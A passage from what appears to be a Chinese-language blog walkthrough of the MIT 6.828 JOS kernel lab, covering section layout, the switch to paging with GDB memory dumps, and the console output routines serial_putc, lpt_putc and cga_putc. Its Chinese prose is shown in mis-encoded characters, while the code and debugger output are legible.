class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line">  1 .rodata       000006bc  f0101a80  00101a80  00002a80  2**5</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  2 .stab         00004219  f010213c  0010213c  0000313c  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  3 .stabstr      0000198a  f0106355  00106355  00007355  2**0</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  4 .data         00009300  f0108000  00108000  00009000  2**12</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  5 .got          00000008  f0111300  00111300  00012300  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  6 .got.plt      0000000c  f0111308  00111308  00012308  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  7 .data.rel.local 00001000  f0112000  00112000  00013000  2**12</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  8 .data.rel.ro.local 00000044  f0113000  00113000  00014000  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  9 .bss          00000648  f0113060  00113060  00014060  2**5</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line"> 10 .comment      00000023  00000000  00000000  000146a8  2**0</span><br><span class="line">                  CONTENTS, READONLY</span><br></pre></td></tr></table></figure><p>VMA ä¸ºè™šæ‹Ÿåœ°å€ï¼ŒLMA ä¸ºåŠ è½½åœ°å€ï¼Œå¯è§ç¡®å®å¦‚æ­¤ã€‚è¿™æ˜¯å› ä¸ºå½“ OS kernel è¢«è¿è¡Œåœ¨è¾ƒé«˜çš„è™šæ‹Ÿåœ°å€æ—¶ï¼Œå…¶å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å°†è™šæ‹Ÿåœ°å€ç©ºé—´çš„ä½åœ°å€éƒ¨åˆ†ç•™ç»™ç”¨æˆ·ç¨‹åºä½¿ç”¨ï¼Œ<strong>ä½†é€šå¸¸å¤§éƒ¨åˆ† 32 ä½æœºå™¨å¹¶æ²¡æœ‰è¶³å¤Ÿå¤§çš„å†…å­˜ï¼Œä»–ä»¬åœ¨ 0xf0100000 å¤„å¾€å¾€æ²¡æœ‰ä»»ä½•ç‰©ç†å†…å­˜</strong>ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å®ç°<strong>è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„æ˜ å°„</strong>ï¼Œè¿™éœ€è¦å€ŸåŠ©é¡µè¡¨çš„å¸®åŠ©ã€‚</p><p>åœ¨è®¾ç½® cr0 å¯„å­˜å™¨çš„ <code>PG</code> æ ‡å¿—ä½å‰ï¼Œæˆ‘ä»¬çš„å†…å­˜ç®¡ç†æ¨¡å¼æ˜¯<strong>åˆ†æ®µ</strong>æ¨¡å¼ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯¹å†…å­˜çš„è®¿é—®ä½¿ç”¨çš„æ˜¯<strong>çº¿æ€§åœ°å€</strong>ï¼ˆlinear addressï¼‰â€”â€”ç”±æ®µé€‰æ‹©å­ä¸æ®µæè¿°ç¬¦è¡¨æ¥æè¿°åˆ†æ®µï¼Œå®Œæˆçº¿æ€§åœ°å€åˆ°ç‰©ç†åœ°å€çš„æ˜ å°„ï¼›åœ¨è®¾ç½®äº† cr0 å¯„å­˜å™¨çš„ <code>PG</code> æ ‡å¿—ä½ä¹‹åï¼Œæˆ‘ä»¬å¯¹å†…å­˜è®¿é—®ä½¿ç”¨çš„å°±æ˜¯<strong>è™šæ‹Ÿåœ°å€</strong>ï¼ˆvirtualï¼‰â€”â€”ç”±é¡µè¡¨æè¿°è™šæ‹Ÿåœ°å€ç©ºé—´åˆ°ç‰©ç†åœ°å€ç©ºé—´çš„æ˜ å°„ï¼Œå¹¶ç”± MMU å®Œæˆç¿»è¯‘</p><p>32ä½ä¸‹æœ€å¸¸ç”¨çš„æ˜¯äºŒçº§é¡µè¡¨ï¼Œ6.828 ååˆ†è´´å¿ƒåœ°åœ¨ <code>kern/entrypgdir.c</code> ä¸­æ‰‹å†™äº†ä¸€ä¸ªé™æ€åˆå§‹åŒ–çš„é¡µè¡¨ç»“æ„ï¼Œè®¾ç½®äº†è™šæ‹Ÿåœ°å€ <code>0xf0000000 ~ 0xf0400000</code> åˆ°ç‰©ç†åœ°å€ <code>0x00000000 ~ 0x00400000</code> æ˜ å°„ï¼Œä»¥åŠè™šæ‹Ÿåœ°å€ <code>0x00000000 ~ 0x00400000</code> åˆ°ç‰©ç†åœ°å€ <code>0x00000000 ~ 0x00400000</code> æ˜ å°„ã€‚</p><p>è‹¥æˆ‘ä»¬å°è¯•è®¿é—®ä¸å±äºè¿™ä¸¤ä¸ªåœ°å€èŒƒå›´çš„åœ°å€ï¼Œåˆ™ä¼šè§¦å‘ç¼ºé¡µä¸­æ–­ï¼Œç”±äºæˆ‘ä»¬å°šæœªè®¾ç½®å¯¹åº”çš„ä¸­æ–­å¤„ç†ç¨‹åºï¼Œå› æ­¤ä¼šå¯¼è‡´ QEMU crash å¹¶é€€å‡º</p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 7ï¼ŒæŸ¥çœ‹åˆ†é¡µæœºåˆ¶å¼€å¯å‰å <code>0x00100000</code> ä¸ <code>0xf0100000</code> è¿™ä¸¤ä¸ªåœ°å€ä¸Šçš„æ•°æ®</p><blockquote><p>Exercise 7.Â Use QEMU and GDB to trace into the JOS kernel and stop at the <code>movl %eax, %cr0</code>. Examine memory at 0x00100000 and at 0xf0100000. Now, single step over that instruction using theÂ stepiÂ GDB command. Again, examine memory at 0x00100000 and at 0xf0100000. Make sure you understand what just happened.</p><p>What is the first instruction <em>after</em> the new mapping is established that would fail to work properly if the mapping werenâ€™t in place? Comment out the <code>movl %eax, %cr0</code> inÂ kern&#x2F;entry.S, trace into it, and see if you were right.</p></blockquote><p>ç»“æœå¦‚ä¸‹ï¼Œåœ¨æˆåŠŸå»ºç«‹é¡µè¡¨æ˜ å°„ä¹‹åè¿™ä¸¤ä¸ªåœ°å€çš„æ•°æ®æ˜¯ä¸€è‡´çš„ï¼Œå› ä¸º<strong>å®Œæˆæ˜ å°„åè¿™ä¸¤ä¸ªè™šæ‹Ÿåœ°å€ç©ºé—´æŒ‡å‘åŒä¸€ç‰©ç†åœ°å€ç©ºé—´</strong>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">(gdb) </span><br><span class="line">=&gt; 0x10001d:    mov    %cr0,%eax</span><br><span class="line">0x0010001d in ?? ()</span><br><span class="line">(gdb) si</span><br><span class="line">=&gt; 0x100020:    or     $0x80010001,%eax</span><br><span class="line">0x00100020 in ?? ()</span><br><span class="line">(gdb) x /8x 0x00100000</span><br><span class="line">0x100000:    0x1badb002    0x00000000    0xe4524ffe    0x7205c766</span><br><span class="line">0x100010:    0x34000004    0x2000b812    0x220f0011    0xc0200fd8</span><br><span class="line">(gdb) x /8x 0xf0100000</span><br><span class="line">0xf0100000 &lt;_start-268435468&gt;:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0xf0100010 &lt;entry+4&gt;:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">(gdb) si</span><br><span class="line">=&gt; 0x100025:    mov    %eax,%cr0</span><br><span class="line">0x00100025 in ?? ()</span><br><span class="line">(gdb) </span><br><span class="line">=&gt; 0x100028:    mov    $0xf010002f,%eax</span><br><span class="line">0x00100028 in ?? ()</span><br><span class="line">(gdb) x /8x 0x00100000</span><br><span class="line">0x100000:    0x1badb002    0x00000000    0xe4524ffe    0x7205c766</span><br><span class="line">0x100010:    0x34000004    0x2000b812    0x220f0011    0xc0200fd8</span><br><span class="line">(gdb) x /8x 0xf0100000</span><br><span class="line">0xf0100000 &lt;_start-268435468&gt;:    0x1badb002    0x00000000    0xe4524ffe    0x7205c766</span><br><span class="line">0xf0100010 &lt;entry+4&gt;:    0x34000004    0x2000b812    0x220f0011    0xc0200fd8</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure><h3 id="Formatted-Printing-to-the-Console"><a href="#Formatted-Printing-to-the-Console" class="headerlink" title="Formatted Printing to the Console"></a>Formatted Printing to the Console</h3><p>è¿™éƒ¨åˆ†è¦æ±‚æˆ‘ä»¬é˜…è¯» <code>kern/printf.c, lib/printfmt.c, kern/console.c</code> ä»¥äº†è§£ xv6 å‘æ§åˆ¶å°è¾“å‡ºå­—ç¬¦çš„å®ç°ã€‚åœ¨æ­£å¼å¼€å§‹é˜…è¯»ä»£ç ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆè‡ªè¡Œæ€è€ƒä¸€ä¸‹ï¼šå¦‚ä½•åœ¨ä¸€å— 80 * 24 çš„å±å¹•ä¸Šå®ç°å„ç§å„æ ·çš„è¾“å‡ºåŠŸèƒ½ï¼Ÿ</p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼Œæ‰€æœ‰çš„è¾“å‡ºæ“ä½œæœ€ç»ˆéƒ½å¯ä»¥é€šè¿‡ä½¿ç”¨ä¸€ä¸ªâ€œè¾“å‡ºåŸè¯­â€å®ç°â€”â€”ã€Œè¾“å‡ºå•ä¸ªå­—ç¬¦ã€ï¼Œæˆ‘ä»¬åœ¨å®ç°å…¶ä»–çš„è¾“å‡ºåŠŸèƒ½ï¼Œä¾‹å¦‚ printf æˆ–æ˜¯ puts æ—¶ï¼Œåªéœ€è¦åœ¨è¿™äº›å‡½æ•°å†…éƒ¨å¤šæ¬¡è°ƒç”¨è¿™ä¸ªè¾“å‡ºåŸè¯­å³å¯ã€‚</p><p>è¿™ä¸ªè¾“å‡ºåŸè¯­åº”å½“å®Œæˆå¦‚ä¸‹åŠŸèƒ½ï¼š</p><ul><li><p>åœ¨å±å¹•å…‰æ ‡å¤„è¾“å‡ºå­—ç¬¦ï¼Œå¹¶é€‚å½“ç§»åŠ¨å…‰æ ‡ï¼ˆä¾‹å¦‚æ™®é€šå­—ç¬¦åˆ™å°†å…‰æ ‡å‘åç§»åŠ¨ä¸€ä¸ªå­—ç¬¦ï¼Œè€Œ <code>\b</code> åˆ™å°†å…‰æ ‡å‘å‰ç§»åŠ¨ä¸€ä¸ªå­—ç¬¦ï¼Œ <code>\n</code> åˆ™å°†å…‰æ ‡ç§»åˆ°ä¸‹ä¸€è¡Œï¼‰</p></li><li><p>æ§åˆ¶è¾“å‡ºå­—ç¬¦çš„é¢œè‰²</p></li><li><p>å®ŒæˆåŸºç¡€çš„æ¢è¡ŒåŠŸèƒ½ï¼Œå½“å±å¹•è¢«å­—ç¬¦å¡«å……æ»¡æ—¶è¿›è¡Œæ»šå±</p></li></ul><p>å‰é¢æˆ‘ä»¬è®²åˆ°ï¼Œåœ¨ BIOS æ—¶æœŸ<strong>æœ‰ä¸€éƒ¨åˆ†æ˜¾å­˜è¢«æ˜ å°„åˆ°å†…å­˜å½“ä¸­ï¼Œå…¶å®æˆ‘ä»¬åªéœ€è¦ç›´æ¥å¾€æ˜¾å­˜ä¸Šå†™å…¥æ•°æ®å³å¯æ§åˆ¶å±å¹•è¾“å‡º</strong>ï¼Œå› æ­¤æœ€ç»ˆæ¶‰åŠåˆ°ä¸æ˜¾å¡äº¤äº’çš„å…¶å®åªæœ‰å…‰æ ‡</p><p><code>0xB800~0xBFFF</code> è¿™å—åŒºåŸŸæ˜¯ä¾›æ–‡æœ¬æ¨¡å¼ä½¿ç”¨çš„æ˜¾å­˜ï¼Œå½“æˆ‘ä»¬åœ¨æ˜¾å­˜å†…çš„ç›¸åº”ä½ç½®å†™å…¥æ•°æ®æ—¶ï¼Œå±å¹•ä¸Šå°±ä¼šå‡ºç°å¯¹åº”çš„å­—ç¬¦ï¼Œåœ¨æ–‡æœ¬æ¨¡å¼ä¸‹æ˜¾ç¤ºå™¨æ”¯æŒ <code>80 x 25</code> 16 è‰²æ–‡æœ¬æ˜¾ç¤ºçš„çª—å£ï¼Œä¸€ä¸ªå­—ç¬¦å ç”¨ä¸¤ä¸ªå­—èŠ‚ï¼š<strong>ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º ASCII ç ï¼Œç¬¬äºŒä¸ªå­—èŠ‚ä¸ºé¢œè‰²ä¿¡æ¯</strong></p><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹ xv6 çš„æºç ï¼Œå…¶ä½¿ç”¨ä¸€ä¸ª <code>cons_putc()</code> å‡½æ•°å®ç°äº†è¿™ä¸ªå­—ç¬¦è¾“å‡ºåŸè¯­ï¼Œå®šä¹‰äº <code>kern/console.c</code> ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// output a character to the console</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">cons_putc</span><span class="params">(<span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">    serial_putc(c);</span><br><span class="line">    lpt_putc(c);</span><br><span class="line">    cga_putc(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°å…¶æœ€ç»ˆè°ƒç”¨ä¸‰ä¸ªå‡½æ•°ï¼š<code>serial_putc()</code>ã€<code>lpt_putc()</code>ã€<code>cga_putc()</code>ï¼Œå’‹ä¸€çœ‹æœ‰äº›ä¸€å¤´é›¾æ°´ï¼Œçœ‹å‡½æ•°ååç¼€ä¼¼ä¹è¿™ä¸‰ä¸ªå‡½æ•°éƒ½æ˜¯ç”¨æ¥è¾“å‡ºå•ä¸ªå­—ç¬¦çš„ï¼Ÿ</p><p>å…ˆçœ‹ç¬¬ä¸€ä¸ªå‡½æ•° <code>serial_putc()</code>ï¼Œå…¶ä¸­è°ƒç”¨äº† <code>inb()</code> å’Œ <code>outb()</code> ä¸¤ä¸ªå‡½æ•°ï¼Œè¿™æ˜¯ä¸¤ä¸ªå°è£…å¥½çš„ç”¨ä»¥æ“ä½œç«¯å£çš„å‡½æ•°ï¼Œå±•å¼€ä»¥åå…¶å®å°±æ˜¯å†…è”æ±‡ç¼–å†™çš„ <code>inb</code> å’Œ <code>outb</code> æŒ‡ä»¤ï¼Œå•ä½éƒ½æ˜¯å­—èŠ‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COM_TX        0    <span class="comment">// Out: Transmit buffer (DLAB=0)</span></span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COM_LSR        5    <span class="comment">// In:    Line Status Register</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>   COM_LSR_DATA    0x01    <span class="comment">//   Data available</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>   COM_LSR_TXRDY    0x20    <span class="comment">//   Transmit buffer avail</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>   COM_LSR_TSRE    0x40    <span class="comment">//   Transmitter off</span></span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">serial_putc</span><span class="params">(<span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;</span><br><span class="line">         !(inb(COM1 + COM_LSR) &amp; COM_LSR_TXRDY) &amp;&amp; i &lt; <span class="number">12800</span>;</span><br><span class="line">         i++)</span><br><span class="line">        delay();</span><br><span class="line"></span><br><span class="line">    outb(COM1 + COM_TX, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// inc/x86.h</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint8_t</span></span><br><span class="line"><span class="title function_">inb</span><span class="params">(<span class="type">int</span> port)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> data;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;inb %w1,%0&quot;</span> : <span class="string">&quot;=a&quot;</span> (data) : <span class="string">&quot;d&quot;</span> (port))</span>;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// inc/x86.h</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">outb</span><span class="params">(<span class="type">int</span> port, <span class="type">uint8_t</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;outb %0,%w1&quot;</span> : : <span class="string">&quot;a&quot;</span> (data), <span class="string">&quot;d&quot;</span> (port))</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥çŸ¥é“å…¶ä¸»è¦åŠŸèƒ½å°±æ˜¯ä» <code>Line Status Register</code> ä¸­è¯»å–æ•°æ®ï¼Œè‹¥ä¸ä¸º <code>COM_LSR_TXRDY</code> åˆ™é‡è¯•ï¼ˆæœ€å¤š 12800æ¬¡ï¼‰ï¼Œå¦åˆ™è¯´æ˜ <code>Transmit buffer</code> å·²å°±ç»ªï¼Œä¹‹åä¾¿å‘ <code>Transmit buffer</code> ä¸­å†™å…¥æˆ‘ä»¬è¦è¾“å‡ºçš„å­—ç¬¦</p><p>è¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ª delay å‡½æ•°ï¼Œä¸»è¦æ˜¯ç”±äºå†å²é—ç•™é—®é¢˜ä»è€Œéœ€è¦æ˜¾å¼åœ°ä» 0x84 ç«¯å£ä¸­è¯»å– 4 æ¬¡ 1 å­—èŠ‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Stupid I/O delay routine necessitated by historical PC design flaws</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">delay</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    inb(<span class="number">0x84</span>);</span><br><span class="line">    inb(<span class="number">0x84</span>);</span><br><span class="line">    inb(<span class="number">0x84</span>);</span><br><span class="line">    inb(<span class="number">0x84</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>serial_putc()</code> çš„åŠŸèƒ½å·²ç»æ˜äº†ï¼šæ£€æŸ¥å¯¹åº”ç«¯å£çŠ¶æ€ï¼Œå†™å…¥å­—ç¬¦ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ <code>lpt_putc()</code>ï¼Œè¿˜æ˜¯ä»ä¸€ä¸ªå¥‡æ€ªçš„ç«¯å£è¯»å–æ•°æ®å¹¶æ£€æŸ¥ï¼Œä¹‹åå‘å¦å¤–ä¸¤ä¸ªç«¯å£å†™å…¥å¥‡æ€ªçš„æ•°æ®ï¼Œå› ä¸ºç¬”è€…ä¸æ˜¯ç¡¬ä»¶ç›¸å…³å¼€å‘è€…æ‰€ä»¥è¿™é‡Œå°±ä¸æ·±ç©¶äº†ï¼ˆç¬‘ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***** Parallel port output code *****/</span></span><br><span class="line"><span class="comment">// For information on PC parallel port programming, see the class References</span></span><br><span class="line"><span class="comment">// page.</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">lpt_putc</span><span class="params">(<span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; !(inb(<span class="number">0x378</span>+<span class="number">1</span>) &amp; <span class="number">0x80</span>) &amp;&amp; i &lt; <span class="number">12800</span>; i++)</span><br><span class="line">        delay();</span><br><span class="line">    outb(<span class="number">0x378</span>+<span class="number">0</span>, c);</span><br><span class="line">    outb(<span class="number">0x378</span>+<span class="number">2</span>, <span class="number">0x08</span>|<span class="number">0x04</span>|<span class="number">0x01</span>);</span><br><span class="line">    outb(<span class="number">0x378</span>+<span class="number">2</span>, <span class="number">0x08</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åæ˜¯ <code>cga_putc()</code>ï¼Œè¿™æ˜¯å®ç°å­—ç¬¦è§„èŒƒåŒ–å­—ç¬¦æ‰“å°çš„<strong>æ ¸å¿ƒå‡½æ•°</strong>ï¼š</p><ul><li><p>é¦–å…ˆæ£€æŸ¥è‹¥æœªè®¾ç½®é¢œè‰²å‚æ•°åˆ™é»˜è®¤è®¾ç½®é»‘åº•ç™½å­—</p></li><li><p>ä¹‹åæ˜¯å¯¹ç‰¹æ®Šå­—ç¬¦çš„å¤„ç†ï¼Œå¯¹äºæ™®é€šå­—ç¬¦åˆ™æ˜¯ç›´æ¥å†™æ˜¾å­˜</p></li><li><p>åœ¨å®Œæˆä¹‹åæ£€æŸ¥å…‰æ ‡æ˜¯å¦è¶Šç•Œï¼Œè‹¥æ˜¯åˆ™è¿›è¡Œ<strong>æ»šå±</strong>ï¼Œè¿™é‡Œå®ç°çš„æ–¹æ³•æ¯”è¾ƒç®€å•ç²—æš´ï¼Œç›´æ¥ç§»åŠ¨æ•´å—å†…å­˜åæ¸…ç©ºæœ€åä¸€è¡Œï¼Œå°†å…‰æ ‡ä½ç½®å‘å‰ç§»åŠ¨80å­—ç¬¦ï¼ˆä¸€è¡Œçš„å®½åº¦ï¼‰</p></li><li><p>æœ€åå‘æ˜¾å¡å¯¹åº”å¯„å­˜å™¨å†™å…¥å…‰æ ‡ä½ç½®</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">cga_putc</span><span class="params">(<span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// if no attribute given, then use black on white</span></span><br><span class="line">    <span class="keyword">if</span> (!(c &amp; ~<span class="number">0xFF</span>))</span><br><span class="line">        c |= <span class="number">0x0700</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (c &amp; <span class="number">0xff</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\b&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> (crt_pos &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            crt_pos--;</span><br><span class="line">            crt_buf[crt_pos] = (c &amp; ~<span class="number">0xff</span>) | <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">        crt_pos += CRT_COLS;</span><br><span class="line">        <span class="comment">/* fallthru */</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\r&#x27;</span>:</span><br><span class="line">        crt_pos -= (crt_pos % CRT_COLS);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\t&#x27;</span>:</span><br><span class="line">        cons_putc(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        cons_putc(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        cons_putc(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        cons_putc(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        cons_putc(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        crt_buf[crt_pos++] = c;        <span class="comment">/* write the character */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// What is the purpose of this?</span></span><br><span class="line">    <span class="keyword">if</span> (crt_pos &gt;= CRT_SIZE) &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">        memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * <span class="keyword">sizeof</span>(<span class="type">uint16_t</span>));</span><br><span class="line">        <span class="keyword">for</span> (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)</span><br><span class="line">            crt_buf[i] = <span class="number">0x0700</span> | <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        crt_pos -= CRT_COLS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* move that little blinky thing */</span></span><br><span class="line">    outb(addr_6845, <span class="number">14</span>);</span><br><span class="line">    outb(addr_6845 + <span class="number">1</span>, crt_pos &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    outb(addr_6845, <span class="number">15</span>);</span><br><span class="line">    outb(addr_6845 + <span class="number">1</span>, crt_pos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªå®ç°æ–¹æ³•å’Œç¬”è€…å½“æ—¶å†™å®éªŒæ€§è´¨ OS kernel çš„æ—¶å€™å€’æ˜¯ä¸€æ ·ï¼Œä¸è¿‡ä»¤ç¬”è€…ä¸çˆ½çš„æ˜¯ xv6 å°† <code>\t</code> å®ç°ä¸ºåˆ«æ‰­çš„ 5 ä¸ªç©ºæ ¼ï¼ˆæ¼ï¼‰</p></blockquote><p>è¿™ä¹ˆä¸€è½®åˆ†æä¸‹æ¥è¿™ä¸ªå­—ç¬¦è¾“å‡ºåŸè¯­å·²ç»åŸºæœ¬ä¸Šåˆ†æå¾—å·®ä¸å¤šäº†ï¼Œå‰©ä¸‹çš„ä¸€äº›é«˜çº§çš„å°è£…å‡½æ•°ç¬”è€…å°±ä¸æ·±å…¥åˆ†æè´´åœ¨è¿™é‡Œäº†ï¼Œä¸»è¦å°±æ˜¯å€ŸåŠ©è¿™ä¸ªå­—ç¬¦è¾“å‡ºåŸè¯­å®ç°çš„ä¸€äº› tricksï¼Œå…¶ä¸­å¯¹äºæ ¼å¼åŒ–å­—ç¬¦ä¸²è¾“å‡º xv6 å®ç°ä¸º <code>printfmt()</code> å‡½æ•°ï¼Œå…¶æ 